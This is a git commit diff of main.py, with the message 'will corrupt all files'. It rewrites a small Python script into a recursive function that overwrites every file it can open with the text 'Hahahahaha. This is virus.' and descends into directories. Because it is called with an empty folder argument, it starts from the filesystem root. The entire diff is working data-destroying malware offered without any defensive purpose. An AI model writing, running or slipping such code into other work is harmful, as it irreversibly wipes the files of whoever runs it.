088876f70d3ce1fa5bd698d426217e616d721d72
BekhruzSNiyazov <bekhruzsniyazov@outlook.com>
2020-11-06 21:43:47 +0200

    will corrupt all files

--- main.py
+++ main.py
@@ -1,12 +1,11 @@
 from glob import glob
 
+def corrupt(folder=""):
+    for file in glob(folder + "/" + "*"):
+        try:
+            with open(file, "w+") as f:
+                f.write("Hahahahaha. This is virus.")
+        except: corrupt(folder=file)
+
 for file in glob("*"):
-    try:
-        with open(file, "w+") as f:
-            f.write("Hahahahaha. This is virus.")
-    except:
-        for fl in glob(file + "/" + "*"):
-            try:
-                with open(file, "w+") as f:
-                    f.write("Hahahahah. This is a virus.")
-            except: pass
+    corrupt()
